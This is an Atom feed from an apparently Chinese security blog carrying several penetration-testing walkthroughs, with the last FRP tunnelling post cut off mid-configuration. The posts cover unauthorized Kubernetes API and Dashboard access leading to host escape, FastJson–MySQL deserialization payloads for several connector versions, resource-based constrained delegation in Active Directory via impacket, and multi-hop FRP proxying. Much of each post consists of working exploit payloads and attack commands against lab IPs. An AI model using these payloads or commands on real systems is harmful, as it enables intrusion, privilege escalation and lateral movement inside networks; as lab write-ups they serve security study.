<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sriracha :)</title>
  
  <subtitle>Wow, the smell is great!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://sherlocz.github.io/"/>
  <updated>2023-02-15T07:56:30.916Z</updated>
  <id>http://sherlocz.github.io/</id>
  
  <author>
    <name>sher10ck</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>K8S 6443未授权访问</title>
    <link href="http://sherlocz.github.io/2023/02/15/K8S-6443%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <id>http://sherlocz.github.io/2023/02/15/K8S-6443未授权访问/</id>
    <published>2023-02-15T07:04:08.000Z</published>
    <updated>2023-02-15T07:56:30.916Z</updated>
    
    <content type="html"><![CDATA[<p>如果不小心，将”system:anonymous”用户绑定到”cluster-admin”用户组，从而使6443 端口允许匿名用户以管理员权限向集群内部下发指令<br><img src="/2023/02/15/K8S-6443未授权访问/403.png" alt><br>使用以下命令将anonymous用户绑定到cluster-admin用户组<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create clusterrolebinding system:anonymous --clusterrole=cluster-admin --user=system:anonymous</span><br></pre></td></tr></table></figure></p><p><img src="/2023/02/15/K8S-6443未授权访问/ano.png" alt></p><h1 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h1><p>使用以下命令认证，其他方式和8080端口未授权的一样，创建pod挂载，然后chroot到宿主机<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kubectl --insecure-skip-tls-verify  -s https://192.168.116.132:6443 get pods</span><br></pre></td></tr></table></figure></p><p><img src="/2023/02/15/K8S-6443未授权访问/verify.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;如果不小心，将”system:anonymous”用户绑定到”cluster-admin”用户组，从而使6443 端口允许匿名用户以管理员权限向集群内部下发指令&lt;br&gt;&lt;img src=&quot;/2023/02/15/K8S-6443未授权访问/403.png&quot; alt&gt;&lt;br&gt;
      
    
    </summary>
    
    
    
      <category term="云安全" scheme="http://sherlocz.github.io/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>K8S API 未授权访问</title>
    <link href="http://sherlocz.github.io/2023/02/15/K8S-API-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <id>http://sherlocz.github.io/2023/02/15/K8S-API-未授权访问/</id>
    <published>2023-02-15T01:36:09.000Z</published>
    <updated>2023-02-15T08:07:26.920Z</updated>
    
    <content type="html"><![CDATA[<p>#环境搭建#<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#docker=23.0.1</span><br><span class="line">sudo apt-get install docker-ce</span><br><span class="line"></span><br><span class="line">#使用metarget安装1.19.1版本k8s</span><br><span class="line">./metarget gadget install k8s --version=1.19.1</span><br></pre></td></tr></table></figure></p><p>这里纠结版本问题尝试了好多次，高版本的k8s没有未授权访问了，改配置直接报错</p><p>默认8080端口不开，要修改配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#vim /etc/kubernetes/manifests/kube-apiserver.yaml</span><br><span class="line"></span><br><span class="line">- --insecure-port=8080</span><br><span class="line">- --insecure-bind-address=0.0.0.0</span><br></pre></td></tr></table></figure></p><p>默认insecure-port=0，这个时候表示不安全的端口不开放，insecure-bind-address为哪些IP可以访问，高版本没有这个配置</p><p>master机器创建一个nginx的pod<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl run nginx --image=nginx</span><br></pre></td></tr></table></figure></p><p><img src="/2023/02/15/K8S-API-未授权访问/port.png" alt></p><p>然后重启k8s服务：<strong>system restart kubelet</strong><br>这样配置好后没有报错的话就可以用其他机器访问了，我这里用kali访问。</p><p><img src="/2023/02/15/K8S-API-未授权访问/kali.png" alt></p><p>kali攻击机器上安装kubelet<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.19.1/bin/linux/amd64/kubectl</span><br><span class="line">chmod +x ./kubectl</span><br><span class="line">mv ./kubectl /usr/local/bin/kubectl</span><br></pre></td></tr></table></figure></p><p>使用命令获取nodes<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kubectl -s 192.168.116.132:8080 get nodes</span><br></pre></td></tr></table></figure></p><p><img src="/2023/02/15/K8S-API-未授权访问/nodes.png" alt><br>使用命令获取pods<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./kubectl -s 192.168.116.132:8080 get podss</span><br></pre></td></tr></table></figure></p><p><img src="/2023/02/15/K8S-API-未授权访问/pods.png" alt></p><h1 id="攻击测试"><a href="#攻击测试" class="headerlink" title="攻击测试"></a>攻击测试</h1><p>方法一：通过命令直接执行获取pod权限<br><img src="/2023/02/15/K8S-API-未授权访问/nginx.png" alt></p><p>方法二：通过挂在逃逸获取宿主机权</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;#环境搭建#&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;b
      
    
    </summary>
    
    
    
      <category term="云安全" scheme="http://sherlocz.github.io/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>K8S Dashboard未授权访问</title>
    <link href="http://sherlocz.github.io/2023/02/13/K8S-Dashboard%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
    <id>http://sherlocz.github.io/2023/02/13/K8S-Dashboard未授权访问/</id>
    <published>2023-02-13T11:47:04.000Z</published>
    <updated>2023-02-15T08:08:13.635Z</updated>
    
    <content type="html"><![CDATA[<h1 id="K8S环境搭建"><a href="#K8S环境搭建" class="headerlink" title="K8S环境搭建"></a>K8S环境搭建</h1><p>参考：<a href="https://mp.weixin.qq.com/s/-fOfP9r61JRiZnmyVnFEQg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/-fOfP9r61JRiZnmyVnFEQg</a></p><h1 id="K8S-DashBoard配置"><a href="#K8S-DashBoard配置" class="headerlink" title="K8S DashBoard配置"></a>K8S DashBoard配置</h1><p>从 1.10.1 版本起，Dashboard默认禁用了“跳过”按钮。如果需要添加跳过，则需要添加–enable-skip-login命令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.7.0/aio/deploy/recommended.yaml</span><br><span class="line"></span><br><span class="line">#这个命令是生成一个API，进而控制整个集群，不过这个命令只能本地访问</span><br><span class="line">kubectl proxy</span><br></pre></td></tr></table></figure></p><p><img src="/2023/02/13/K8S-Dashboard未授权访问/proxy.png" alt></p><p>访问 <strong>localhost:8001</strong><br><img src="/2023/02/13/K8S-Dashboard未授权访问/8001.png" alt></p><p>访问dashboard地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/.</span><br></pre></td></tr></table></figure></p><p>这里需要凭证，token或者config文件<br><img src="/2023/02/13/K8S-Dashboard未授权访问/dashboard.png" alt></p><p>创建account.yaml文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># Creating a Service Account</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: ServiceAccount</span><br><span class="line">metadata:</span><br><span class="line">  name: admin-user</span><br><span class="line">  namespace: kubernetes-dashboard</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"># Creating a ClusterRoleBinding</span><br><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line">kind: ClusterRoleBinding</span><br><span class="line">metadata:</span><br><span class="line">  name: admin-user</span><br><span class="line">roleRef:</span><br><span class="line">  apiGroup: rbac.authorization.k8s.io</span><br><span class="line">  kind: ClusterRole</span><br><span class="line">  name: cluster-admin</span><br><span class="line">subjects:</span><br><span class="line">- kind: ServiceAccount</span><br><span class="line">  name: admin-user</span><br><span class="line">  namespace: kubernetes-dashboard</span><br></pre></td></tr></table></figure></p><p>使用文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl apply -f account.yaml</span><br></pre></td></tr></table></figure></p><p>创建admin-user用户：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f account.yaml</span><br></pre></td></tr></table></figure></p><p>生成token<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl -n kubernetes-dashboard get secret $(kubectl -n kubernetes-dashboard get sa/admin-user -o jsonpath=&quot;&#123;.secrets[0].name&#125;&quot;) -o go-template=&quot;&#123;&#123;.data.token | base64decode&#125;&#125;&quot;</span><br></pre></td></tr></table></figure></p><p><img src="/2023/02/13/K8S-Dashboard未授权访问/token.png" alt></p><p>这里可能报错非安全登录，运行以下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl -n kubernetes-dashboard port-forward svc/kubernetes-dashboard --address 0.0.0.0 9090:443</span><br></pre></td></tr></table></figure></p><p>输入token后进入后台：<br><img src="/2023/02/13/K8S-Dashboard未授权访问/dashboard.png" alt></p><p>点击这里就可以直接进入pod执行命令了：<br><img src="/2023/02/13/K8S-Dashboard未授权访问/exec.png" alt><br><img src="/2023/02/13/K8S-Dashboard未授权访问/uname.png" alt></p><p>进入后台创建pod挂载到宿主机上，然后chroot获取宿主机权限</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;K8S环境搭建&quot;&gt;&lt;a href=&quot;#K8S环境搭建&quot; class=&quot;headerlink&quot; title=&quot;K8S环境搭建&quot;&gt;&lt;/a&gt;K8S环境搭建&lt;/h1&gt;&lt;p&gt;参考：&lt;a href=&quot;https://mp.weixin.qq.com/s/-fOfP9r61JR
      
    
    </summary>
    
    
    
      <category term="云安全" scheme="http://sherlocz.github.io/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>FastJson-Mysql利用链</title>
    <link href="http://sherlocz.github.io/2021/11/24/fastjson-mysql-bh/"/>
    <id>http://sherlocz.github.io/2021/11/24/fastjson-mysql-bh/</id>
    <published>2021-11-24T08:06:24.000Z</published>
    <updated>2021-11-24T08:10:50.864Z</updated>
    
    <content type="html"><![CDATA[<p>测试环境：</p><p>FastJson = 1.2.68  测试1.2.59也行</p><p>参考文档：</p><p><a href="https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf" target="_blank" rel="noopener">https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf</a></p><p>Mysql Fake（开启Mysql伪服务）：</p><p><a href="https://github.com/fnmsd/MySQL_Fake_Server" target="_blank" rel="noopener">https://github.com/fnmsd/MySQL_Fake_Server</a></p><p>该项目依赖ysoserial反序列化工具：</p><p><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p><p>下载源码，编译：</p><p>mvn clean package -DskipTests<br><img src="/2021/11/24/fastjson-mysql-bh/ysoserial.png" alt></p><p>Mysql Fake项目里面会有config文件需要配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;config&quot;:&#123;</span><br><span class="line">        &quot;ysoserialPath&quot;:&quot;ysoserial-0.0.6-SNAPSHOT-all.jar&quot;,                 #存放ysoserial位置</span><br><span class="line">        &quot;javaBinPath&quot;:&quot;java&quot;,</span><br><span class="line">        &quot;fileOutputDir&quot;:&quot;./fileOutput/&quot;,</span><br><span class="line">        &quot;displayFileContentOnScreen&quot;:true,</span><br><span class="line">        &quot;saveToFile&quot;:true</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;fileread&quot;:&#123;</span><br><span class="line">        &quot;win_ini&quot;:&quot;c:\\windows\\win.ini&quot;,</span><br><span class="line">        &quot;win_hosts&quot;:&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;,</span><br><span class="line">        &quot;win&quot;:&quot;c:\\windows\\&quot;,</span><br><span class="line">        &quot;linux_passwd&quot;:&quot;/etc/passwd&quot;,</span><br><span class="line">        &quot;linux_hosts&quot;:&quot;/etc/hosts&quot;,</span><br><span class="line">        &quot;index_php&quot;:&quot;index.php&quot;,</span><br><span class="line">        &quot;ssrf&quot;:&quot;https://www.baidu.com/&quot;,</span><br><span class="line">        &quot;__defaultFiles&quot;:[&quot;/etc/hosts&quot;,&quot;c:\\windows\\system32\\drivers\\etc\\hosts&quot;]</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;yso&quot;:&#123;</span><br><span class="line">        &quot;Jdk7u21&quot;:[&quot;Jdk7u21&quot;,&quot;calc&quot;],</span><br><span class="line">        &quot;CommonsCollections10&quot;:[&quot;CommonsCollections10&quot;,&quot;calc&quot;],         #反序列化名称+CC链+要执行的命令</span><br><span class="line">        &quot;CommonsCollections5&quot;:[&quot;CommonsCollections5&quot;,&quot;calc&quot;]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>新建Payload_test.java<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">package com.s1;</span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line"> </span><br><span class="line">public class Payload_test &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        String json2=&quot;&#123; \&quot;name\&quot;: &#123; \&quot;@type\&quot;: \&quot;java.lang.AutoCloseable\&quot;, \&quot;@type\&quot;: \&quot;com.mysql.jdbc.JDBC4Connection\&quot;, \&quot;hostToConnectTo\&quot;: \&quot;127.0.0.1\&quot;, \&quot;portToConnectTo\&quot;: 3306, \&quot;info\&quot;: &#123; \&quot;user\&quot;: \&quot;CommonsCollections5\&quot;, \&quot;password\&quot;: \&quot;pass\&quot;, \&quot;statementInterceptors\&quot;: \&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\&quot;, \&quot;autoDeserialize\&quot;: \&quot;true\&quot;, \&quot;NUM_HOSTS\&quot;: \&quot;1\&quot; &#125;, \&quot;databaseToConnectTo\&quot;: \&quot;dbname\&quot;, \&quot;url\&quot;: \&quot;\&quot; &#125; &#125;&quot;;</span><br><span class="line">        Object obj1 = JSON.parse(json2);</span><br><span class="line">            System.out.println(obj1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>pom设置mysql版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;mysql&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;5.1.13&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p><p>启用mysql fake：</p><p>python3 server.py<br><img src="/2021/11/24/fastjson-mysql-bh/server.png" alt></p><p>这里的 yso usernames就是payload中user的值，需要指定<br><img src="/2021/11/24/fastjson-mysql-bh/success.png" alt></p><p>各个版本Payload，目标服务器上需要有相应版本的jar：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">• Mysql connector 5.1.x</span><br><span class="line"> </span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;com.mysql.jdbc.JDBC4Connection&quot;,&quot;hostToConnectTo&quot;:&quot;mysql.host&quot;,&quot;portToConnectTo&quot;:3306,&quot;info&quot;:&#123;&quot;user&quot;:”user&quot;,&quot;password&quot;:”pass&quot;,&quot;statementInterceptors&quot;:&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,&quot;autoDeserialize&quot;:&quot;true&quot;,&quot;NUM_HOSTS&quot;: &quot;1&quot;&#125;,&quot;databaseToConnectTo&quot;:”dbname&quot;,&quot;url&quot;:&quot;&quot;&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">• Mysql connector 6.0.2 or 6.0.3</span><br><span class="line">&#123;&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection&quot;,&quot;proxy&quot;:&#123;&quot;connectionString&quot;:&#123;&quot;url&quot;:&quot;jdbc:mysql://localhost:3306/foo?allowLoadLocalInfile=true&quot;&#125;&#125;&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">• Mysql connector 6.x or &lt; 8.0.20</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection&quot;,&quot;proxy&quot;:&#123;&quot;@type&quot;:&quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy&quot;,&quot;connectionUrl&quot;:&#123;&quot;@type&quot;:&quot;com.mysql.cj.conf.url.ReplicationConnectionUrl&quot;, &quot;masters&quot;:[&#123;&quot;host&quot;:&quot;mysql.host&quot;&#125;], &quot;slaves&quot;:[],&quot;properties&quot;:&#123;&quot;host&quot;:&quot;mysql.host&quot;,&quot;user&quot;:&quot;user&quot;,&quot;dbname&quot;:&quot;dbname&quot;,&quot;password&quot;:&quot;pass&quot;,&quot;queryInterceptors&quot;:&quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,&quot;autoDeserialize&quot;:&quot;true&quot;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;测试环境：&lt;/p&gt;
&lt;p&gt;FastJson = 1.2.68  测试1.2.59也行&lt;/p&gt;
&lt;p&gt;参考文档：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-
      
    
    </summary>
    
    
    
      <category term="我也不知道" scheme="http://sherlocz.github.io/tags/%E6%88%91%E4%B9%9F%E4%B8%8D%E7%9F%A5%E9%81%93/"/>
    
  </entry>
  
  <entry>
    <title>基于资源的约束委派</title>
    <link href="http://sherlocz.github.io/2021/11/23/rbcd-domain/"/>
    <id>http://sherlocz.github.io/2021/11/23/rbcd-domain/</id>
    <published>2021-11-23T02:47:24.000Z</published>
    <updated>2021-11-24T08:13:21.840Z</updated>
    
    <content type="html"><![CDATA[<p>windows 2012 将这个委派交给了用户自己，只需要域用户对服务器具有GenericAll、GenericWrite、WriteProperty、WriteDacl等等权限，就可以设置这个属性，然后通过委派获取ST票据，注入获取服务器权限</p><p>环境：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DC : 192.168.43.100</span><br><span class="line">受害机器(FILE-SERVER) ： 102.168.43.101</span><br><span class="line">攻击机器 : 192.168.43.102</span><br><span class="line">user : attackuser，对FILE-SERVER具有可写的权限</span><br></pre></td></tr></table></figure></p><h1 id="配置用户对机器可写权限"><a href="#配置用户对机器可写权限" class="headerlink" title="配置用户对机器可写权限"></a>配置用户对机器可写权限</h1><p>使用cmd输入 <strong>adsiedit.msc</strong></p><p>找到file-server机器，在安全选项中添加指定用户和权限<br><img src="/2021/11/23/rbcd-domain/file-server-read.png" alt></p><h2 id="使用PowerView查看用户对机器的权限"><a href="#使用PowerView查看用户对机器的权限" class="headerlink" title="使用PowerView查看用户对机器的权限"></a>使用PowerView查看用户对机器的权限</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 查看 SID</span><br><span class="line">Get-DomainUser -Identity [userName] -Properties objectsid</span><br><span class="line"></span><br><span class="line"># 查看写权限</span><br><span class="line">Get-DomainObjectAcl -Identity [computerName] | ?&#123;$_.SecurityIdentifier -match &quot;SID&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/23/rbcd-domain/genericwrite.png" alt><br>有了这个权限，就可以对服务器配置基于资源的约束委派了</p><p>#添加机器账户#</p><h2 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python .\addcomputer.py -computer-name dst01 -computer-pass supe</span><br><span class="line">r_hacker -dc-ip 192.168.43.100 hackme.com/attackuser:sher10ck.</span><br></pre></td></tr></table></figure><p><img src="/2021/11/23/rbcd-domain/impacket-addcomputer.png" alt></p><p>成功添加机器账户，我们可以在域控制器中进行查看</p><p><img src="/2021/11/23/rbcd-domain/dst01.png" alt></p><h2 id="Powermad"><a href="#Powermad" class="headerlink" title="Powermad"></a>Powermad</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount evilsystem -Password $(ConvertTo-SecureString &quot;evil&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure><p><img src="/2021/11/23/rbcd-domain/powermad-newmachineaccount" alt></p><p><img src="/2021/11/23/rbcd-domain/evilsystem.png" alt></p><h1 id="将委派权限授予给机器账户"><a href="#将委派权限授予给机器账户" class="headerlink" title="将委派权限授予给机器账户"></a>将委派权限授予给机器账户</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python rbcd.py -dc-ip 192.168.43.100 -t file-server -f dst01 hackme.com\attackuser:sher1</span><br><span class="line">0ck.</span><br></pre></td></tr></table></figure><p><img src="/2021/11/23/rbcd-domain/rbcd.png" alt></p><h1 id="导出白银票据"><a href="#导出白银票据" class="headerlink" title="导出白银票据"></a>导出白银票据</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python .\getST.py -spn cifs/file-server.hackme.com -impersonate</span><br><span class="line"> administrator -dc-ip 192.168.43.100 hackme.com/dst01$</span><br></pre></td></tr></table></figure><p><img src="/2021/11/23/rbcd-domain/getst.png" alt></p><h1 id="注入票据执行命令"><a href="#注入票据执行命令" class="headerlink" title="注入票据执行命令"></a>注入票据执行命令</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set KRB5CCNAME=administrator.ccache</span><br><span class="line">python atexec.py -no-pass -k</span><br><span class="line">-dc-ip 192.168.43.100 administrator@file-server.hackme.com &quot;whoami&quot;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/23/rbcd-domain/inject.png" alt></p><p><img src="/2021/11/23/rbcd-domain/101.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;windows 2012 将这个委派交给了用户自己，只需要域用户对服务器具有GenericAll、GenericWrite、WriteProperty、WriteDacl等等权限，就可以设置这个属性，然后通过委派获取ST票据，注入获取服务器权限&lt;/p&gt;
&lt;p&gt;环境：&lt;br&gt;
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>使用FRP进行多层流量代理</title>
    <link href="http://sherlocz.github.io/2021/08/07/Multi-Frp/"/>
    <id>http://sherlocz.github.io/2021/08/07/Multi-Frp/</id>
    <published>2021-08-07T04:54:01.000Z</published>
    <updated>2021-08-07T04:55:09.433Z</updated>
    
    <content type="html"><![CDATA[<p>frp作为常用的流量代理工具，在对于内网渗透过程中需要进行多层流量代理依然很方便，没有想象中的那么复杂。</p><p>Github地址：<a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">https://github.com/fatedier/frp</a></p><p>整体思路图如下：</p><p><img src="/2021/08/07/Multi-Frp/思路图.png" alt></p><p>我们需要通过在攻击机器上配置代理链(proxy chain)，去访问内网第三层机器的服务或者资源。</p><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>我这里开了三台虚拟机，配置了双网卡机器，在虚拟机内新建网卡，然后自定义IP，最后关掉防火墙就行：</p><p><img src="/2021/08/07/Multi-Frp/配置图.png" alt></p><h1 id="frp配置"><a href="#frp配置" class="headerlink" title="frp配置"></a>frp配置</h1><p>frp分为Server端和Client端，在作为代理的机器上配置好frps，需要把流量带出的机器配置frpc。</p><p>整体路线如下：<br><img src="/2021/08/07/Multi-Frp/sc.png" alt></p><p>在VPS上上传好我们的frps，frps.ini文件内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 47854#客户端回连端口</span><br><span class="line">dashboard_port = 47855#web管理端端口</span><br><span class="line">token = !q@w#e$r#加入token值进行认证</span><br><span class="line">dashboard_user = 0934ht39#web端账号</span><br><span class="line">dashboard_pwd = qpo34hjtpq4#web端密码</span><br></pre></td></tr></table></figure></p><p>后台启用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./frps -c frps.ini 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure></p><p>输出如下表示成功：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@VM-16-8-ubuntu:/home/frp/frptest# cat nohup.out</span><br><span class="line">2021/08/07 11:41:51 [I] [service.go:157] frps tcp listen on 0.0.0.0:47854</span><br><span class="line">2021/08/07 11:41:51 [I] [service.go:273] Dashboard listen on 0.0.0.0:47855</span><br><span class="line">2021/08/07 11:41:51 [I] [root.go:209] start frps success</span><br></pre></td></tr></table></figure></p><p>接下来配置客户端，上传frpc，frpc.ini内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = xx.xx.xx.xx#VPS地址</span><br><span class="line">server_port = 47854#Server端设置的回连端口</span><br><span class="line">token = 